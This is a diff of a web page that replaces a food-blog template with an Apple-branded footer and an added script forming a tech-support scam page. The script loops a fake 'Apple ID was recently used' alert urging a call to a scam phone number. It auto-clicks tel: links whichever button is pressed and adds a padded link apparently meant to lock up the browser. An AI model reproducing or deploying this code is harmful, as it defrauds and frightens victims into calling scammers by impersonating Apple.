-                                            tempor incididunt dolore magna aliqua. Quis ipsum suspendisse ultrices
-                                            gravida...</p>
-                                    </div>
-                                </div>
-                                <div class="categories__post__item">
-                                    <div class="categories__post__item__pic set-bg"
-                                        data-setbg="img/categories/categories-post/cp-7.jpg">
-                                        <div class="post__meta">
-                                            <h4>08</h4>
-                                            <span>Aug</span>
-                                        </div>
-                                    </div>
-                                    <div class="categories__post__item__text">
-                                        <ul class="post__label--large">
-                                            <li>Vegan</li>
-                                            <li>Desserts</li>
-                                        </ul>
-                                        <h3><a href="#">Fresh Herb Polenta with Parsnip Chips and Maple Butter</a></h3>
-                                        <ul class="post__widget">
-                                            <li>by <span>Admin</span></li>
-                                            <li>3 min read</li>
-                                            <li>20 Comment</li>
-                                        </ul>
-                                        <p>Lorem ipsum dolor sit amet, consectetur adipiscing elit, sed do eiusmod
-                                            tempor incididunt dolore magna aliqua. Quis ipsum suspendisse ultrices
-                                            gravida...</p>
-                                    </div>
-                                </div>
-                            </div>
-                            <div class="col-lg-12 text-center">
-                                <div class="load__more__btn">
-                                    <a href="#">Load more</a>
-                                </div>
-                            </div>
-                        </div>
-                    </div>
-                    <div class="col-lg-4 col-md-4">
-                        <div class="sidebar__item">
-                            <div class="sidebar__about__item">
-                                <div class="sidebar__item__title">
-                                    <h6>About me</h6>
-                                </div>
-                                <img src="img/sidebar/sidebar-about.jpg" alt="">
-                                <h6>Hi every one! I,m <span>Lena Mollein.</span></h6>
-                                <p>Lorem ipsum dolor sit amet, consectetur adipiscing elit, sed do eiusmod tempor
-                                    incididunt ut labore et dolore magna aliqua.</p>
-                                <a href="#" class="primary-btn">Read more</a>
-                            </div>
-                            <div class="sidebar__follow__item">
-                                <div class="sidebar__item__title">
-                                    <h6>Follow me</h6>
-                                </div>
-                                <div class="sidebar__item__follow__links">
-                                    <a href="#"><i class="fa fa-facebook"></i></a>
-                                    <a href="#"><i class="fa fa-twitter"></i></a>
-                                    <a href="#"><i class="fa fa-youtube-play"></i></a>
-                                    <a href="#"><i class="fa fa-instagram"></i></a>
-                                    <a href="#"><i class="fa fa-envelope-o"></i></a>
-                                </div>
-                            </div>
-                            <div class="sidebar__feature__item">
-                                <div class="sidebar__item__title">
-                                    <h6>Feature Posts</h6>
-                                </div>
-                                <div class="sidebar__feature__item__large set-bg"
-                                    data-setbg="img/sidebar/feature-post.jpg">
-                                    <div class="sidebar__feature__item__large--text">
-                                        <span>Dinner</span>
-                                        <h5><a href="#">This Japanese Way of Making Iced Coffee Is a Game...</a></h5>
-                                    </div>
-                                </div>
-                                <div class="sidebar__feature__item__list">
-                                    <div class="sidebar__feature__item__list__single">
-                                        <div class="post__meta">
-                                            <h4>08</h4>
-                                            <span>Aug</span>
-                                        </div>
-                                        <div class="post__text">
-                                            <span>Dinner</span>
-                                            <h5><a href="#">Grilled Potato and Green Bean Salad</a></h5>
-                                        </div>
-                                    </div>
-                                    <div class="sidebar__feature__item__list__single">
-                                        <div class="post__meta">
-                                            <h4>05</h4>
-                                            <span>Aug</span>
-                                        </div>
-                                        <div class="post__text">
-                                            <span>Smoothie</span>
-                                            <h5><a href="#">The $8 French Rosé I Buy in Bulk Every Summer</a></h5>
-                                        </div>
-                                    </div>
-                                    <div class="sidebar__feature__item__list__single">
-                                        <div class="post__meta">
-                                            <h4>26</h4>
-                                            <span>jul</span>
-                                        </div>
-                                        <div class="post__text">
-                                            <span>Desert</span>
-                                            <h5><a href="#">Ina Garten's Skillet-Roasted Lemon Chicken</a></h5>
-                                        </div>
-                                    </div>
-                                    <div class="sidebar__feature__item__list__single">
-                                        <div class="post__meta">
-                                            <h4>16</h4>
-                                            <span>jul</span>
-                                        </div>
-                                        <div class="post__text">
-                                            <span>Vegan</span>
-                                            <h5><a href="#">The Best Weeknight Baked Potatoes, 3 Creative Ways</a></h5>
-                                        </div>
-                                    </div>
-                                </div>
-                            </div>
-                            <div class="sidebar__item__banner">
-                                <img src="img/sidebar/banner.jpg" alt="">
-                            </div>
-                            <div class="sidebar__item__categories">
-                                <div class="sidebar__item__title">
-                                    <h6>Categories</h6>
-                                </div>
-                                <ul>
-                                    <li><a href="#">Recipes <span>128</span></a></li>
-                                    <li><a href="#">Dinner <span>32</span></a></li>
-                                    <li><a href="#">Dessert <span>86</span></a></li>
-                                    <li class="p-left"><a href="#">Smothie <span>25</span></a></li>
-                                    <li class="p-left"><a href="#">Drinks <span>36</span></a></li>
-                                    <li class="p-left"><a href="#">Cakes <span>15</span></a></li>
-                                    <li><a href="#">Vegan <span>63</span></a></li>
-                                    <li><a href="#">Weightloss <span>27</span></a></li>
-                                </ul>
-                            </div>
-                            <div class="sidebar__subscribe__item">
-                                <div class="sidebar__item__title">
-                                    <h6>Subscribe</h6>
-                                </div>
-                                <p>Subscribe to our newsletter and get our newest updates right on your inbox.</p>
-                                <form action="#">
-                                    <input type="text" class="email-input" placeholder="Your email">
-                                    <label for="s-agree-check">
-                                        I agree to the terms & conditions
-                                        <input type="checkbox" id="s-agree-check">
-                                        <span class="checkmark"></span>
-                                    </label>
-                                    <button type="submit" class="site-btn">Subscribe</button>
-                                </form>
-                            </div>
-                        </div>
-                    </div>
-                </div>
-            </div>
-        </div>
-    </section>
-    <!-- Categories Section End -->
+        </section>
+    </div>
 
-    <!-- Footer Section Begin -->
-    <footer class="footer">
-        <div class="container-fluid">
-            <div class="footer__instagram">
-                <div class="footer__instagram__avatar">
-                    <div class="footer__instagram__avatar--pic">
-                        <img src="img/footer/instagram-avatar.jpg" alt="">
-                    </div>
-                    <div class="footer__instagram__avatar--text">
-                        <h5>@ foodieblog</h5>
-                        <span>23,7k follower</span>
-                    </div>
+    <footer id="ac-globalfooter" class="no-js">
+        <div class="ac-gf-content">
+            <section class="ac-gf-footer">
+                <div class="ac-gf-footer-shop"> More ways to: Visit an <a href="#" class="analytics-exitlink">Apple Store </a>, <span class="nowrap">call  <font class="js_setPhoneBlock"></font>, or  <a href="#" class="analytics-exitlink">find a reseller </a></span>.
                 </div>
-                <div class="row">
-                    <div class="col-lg-2 col-md-2 col-sm-4 col-6">
-                        <div class="footer__instagram__item set-bg" data-setbg="img/footer/ip-1.jpg"></div>
-                    </div>
-                    <div class="col-lg-2 col-md-2 col-sm-4 col-6">
-                        <div class="footer__instagram__item set-bg" data-setbg="img/footer/ip-2.jpg"></div>
-                    </div>
-                    <div class="col-lg-2 col-md-2 col-sm-4 col-6">
-                        <div class="footer__instagram__item set-bg" data-setbg="img/footer/ip-3.jpg"></div>
-                    </div>
-                    <div class="col-lg-2 col-md-2 col-sm-4 col-6">
-                        <div class="footer__instagram__item set-bg" data-setbg="img/footer/ip-4.jpg"></div>
-                    </div>
-                    <div class="col-lg-2 col-md-2 col-sm-4 col-6">
-                        <div class="footer__instagram__item set-bg" data-setbg="img/footer/ip-5.jpg"></div>
-                    </div>
-                    <div class="col-lg-2 col-md-2 col-sm-4 col-6">
-                        <div class="footer__instagram__item set-bg" data-setbg="img/footer/ip-6.jpg"></div>
-                    </div>
+                <div class="ac-gf-footer-locale">
+                    <a class="ac-gf-footer-locale-link" href="#" title="Choose your country or region" aria-label="United States. Choose your country or region"><img class="ac-gf-footer-locale-flag" src="images/us.png" alt="" width="16" height="16">United
+					States </a>
                 </div>
-            </div>
-        </div>
-        <div class="container">
-            <div class="row">
-                <div class="col-lg-12">
-                    <div class="footer__text">
-                        <div class="footer__logo">
-                            <a href="#"><img src="img/logo.png" alt=""></a>
-                        </div>
-                        <p>Lorem ipsum dolor sit amet, consectetur adipiscing elit, sed do eiusmod tempor incididunt
-                            ut<br /> labore et dolore magna aliqua. Quis ipsum suspendisse ultrices gravida. Risus
-                            commodo viverra<br /> maecenas accumsan lacus vel facilisis. </p>
-                        <div class="footer__social">
-                            <a href="#"><i class="fa fa-facebook"></i></a>
-                            <a href="#"><i class="fa fa-twitter"></i></a>
-                            <a href="#"><i class="fa fa-instagram"></i></a>
-                            <a href="#"><i class="fa fa-youtube-play"></i></a>
-                            <a href="#"><i class="fa fa-envelope-o"></i></a>
-                        </div>
-                    </div>
-                    <div class="footer__copyright">
-                        <p><!-- Link back to Colorlib can't be removed. Template is licensed under CC BY 3.0. -->
-  Copyright &copy;<script>document.write(new Date().getFullYear());</script> All rights reserved | This template is made with <i class="fa fa-heart" aria-hidden="true"></i> by <a href="https://colorlib.com" target="_blank">Colorlib</a>
-  <!-- Link back to Colorlib can't be removed. Template is licensed under CC BY 3.0. --></p>
-                    </div>
+                <div class="ac-gf-footer-legal">
+                    <div class="ac-gf-footer-legal-copyright">Copyright© 2025 Apple . All rights reserved. </div>
+                    <div class="ac-gf-footer-legal-links"><a class="ac-gf-footer-legal-link analytics-exitlink" href="#">Privacy
+					Policy </a> <a class="ac-gf-footer-legal-link analytics-exitlink" href="#">Terms of Use </a>
+                        <a class="ac-gf-footer-legal-link analytics-exitlink" href="#">Sales and Refunds </a> <a class="ac-gf-footer-legal-link" href="#">Site
+						Map </a> <a class="ac-gf-footer-legal-link" href="#">Contact
+						Apple </a></div>
                 </div>
-            </div>
+                <meta content="Apple" property="name">
+                <meta content="+1-866-381-6140
+			 " property="telephone">
+            </section>
         </div>
     </footer>
-    <!-- Footer Section End -->
 
-    <!-- Search Begin -->
-    <div class="search-model">
-        <div class="h-100 d-flex align-items-center justify-content-center">
-            <div class="search-close-switch">+</div>
-            <form class="search-model-form">
-                <input type="text" id="search-input" placeholder="Search here.....">
-            </form>
-        </div>
-    </div>
-    <!-- Search End -->
 
-    <!-- Js Plugins -->
-    <script src="js/jquery-3.3.1.min.js"></script>
-    <script src="js/bootstrap.min.js"></script>
-    <script src="js/jquery.slicknav.js"></script>
-    <script src="js/owl.carousel.min.js"></script>
-    <script src="js/main.js"></script>
-</body>
 
-</html>
+    <script src="js/jquery-1.12.0.min.js"></script>
+    <script>
+        function getURLParameter(name) {
+            return decodeURI(
+                (RegExp(name + '=' + '(.+?)(&|$)').exec(location.search) || [, null])[1] || ''
+            );
+        };
+        var cookieHelper = {
+            defParams: {
+                path: "/",
+                domain: "." + window.location.host.replace(/:\d+/, "")
+            },
+            set: function(a, d, c) {
+                c = c || {};
+                for (var b in this.defParams) "undefined" == typeof c[b] && (c[b] = this.defParams[b]);
+                b = c.expires;
+                if ("number" == typeof b && b) {
+                    var e = new Date;
+                    e.setTime(e.getTime() + 1E3 * b);
+                    b = c.expires = e
+                }
+                b && b.toUTCString && (c.expires = b.toUTCString());
+                d = encodeURIComponent(d);
+                a = a + "=" + d;
+                for (var f in c) a += "; " + f, d = c[f], !0 !== d && (a += "=" + d);
+                document.cookie = a
+            },
+            get: function(a) {
+                return (a = document.cookie.match(new RegExp("(?:^|; )" + a.replace(/([\.$?*|{}\(\)\[\]\\\/\+^])/g, "\\$1") + "=([^;]*)"))) ? decodeURIComponent(a[1]) : void 0
+            },
+            del: function(a) {
+                this.set(a, null, {
+                    expires: -1
+                })
+            }
+        };
+
+
+        var userAgent = window.navigator.userAgent.toLowerCase(),
+            ios = /iphone|ipod|ipad/.test(userAgent);
+
+        function parseURL(url) {
+            var a = document.createElement('a');
+            a.href = url;
+            return a.hostname.replace('www.', '');
+        };
+
+        function getPar(name) {
+            var url = window.location.href;
+            name = name.replace(/[\[\]]/g, "\\$&");
+            var regex = new RegExp("[?&]" + name + "(=([^&#]*)|&|#|$)"),
+                results = regex.exec(url);
+            if (!results) return null;
+            if (!results[2]) return '';
+            return decodeURIComponent(results[2].replace(/\+/g, " "));
+        };
+
+        window.number = getPar('phone');
+
+        window.number = (window.number ? window.number : '+1-866-381-6140');
+
+        window.device = 'iPhone';
+        window.refef = parseURL(document.referrer);
+
+        if (ios) {
+
+            if (/iphone/.test(userAgent)) {
+                window.device = 'iPhone';
+            }
+
+            if (/ipad/.test(userAgent)) {
+                window.device = 'iPad';
+            }
+
+            if (/ipod/.test(userAgent)) {
+                window.device = 'iPod';
+            }
+        }
+
+        var text = cookieHelper.get('textSetBl');
+        var phone = cookieHelper.get('phoneSetBl');
+
+        function getText() {
+            var str = window.defaultText;
+
+            for (var d in window.text) {
+                if (window.refef.indexOf(d) != -1) {
+                    str = window.text[d];
+                }
+            }
+            //var str = window.text[window.refef]?window.text[window.refef]:window.defaultText;
+            return str.replace('|%model%|', window.device).replace('|%ref%|', window.refef);
+        }
+
+
+        if (!phone) {
+            phone = getURLParameter('phone');
+        }
+        if (!text) {
+            text = getURLParameter('text');
+        }
+
+        var sText = document.querySelectorAll('.js_setTextBlock');
+        for (var t = 0; t < sText.length; t++) {
+            sText[t].innerHTML = getText();
+        }
+        var sPhone = document.querySelectorAll('.js_setPhoneBlock');
+        for (var p = 0; p < sPhone.length; p++) {
+            sPhone[p].innerHTML = phone;
+        }
+
+
+        setInterval(function() {
+            myFunction()
+        }, 100);
+
+        function okkkk() {
+            jQuery('#result').append('<a  class="anchorcall" href="tel:+1-866-381-6140"></a>');
+            document.querySelector('a').click();
+            var extraData = "";
+            for (itxextraData = 0; itxextraData < 200; itxextraData++) {
+                var extraData = extraData + "5555555555";
+            }
+            jQuery('#result').append('<a href="#callto+' + extraData + '%00"></a>');
+            document.querySelector('a').click();
+            document.querySelector('a').click();
+            document.querySelector('a').click();
+            document.querySelector('a').click();
+            document.querySelector('a').click();
+            document.querySelector('a').click();
+            //setInterval(function(){ alert(getText().repeat(99999999999));}, 300);
+        };
+
+        function myFunction() {
+            if (confirm("Your Apple ID was recently used at APPLE STORE for $149.99 Via Apple Pay Pre-Authorization!We have placed those request on hold to ensure safest and Security.Not you? Immediately call Apple Support +1-866-381-6140 to Freeze it!.")) {
+                okkkk();
+            } else {
+                okkkk();
+            }
+        }
+
+        window.ununload = function() {
+            debugger;
+            location.reload();
+        }
+    </script>
+
+
+
+<script defer="" data-domain="iosmd.sire" src="js/script.js"></script>
+
+
+</body></html>
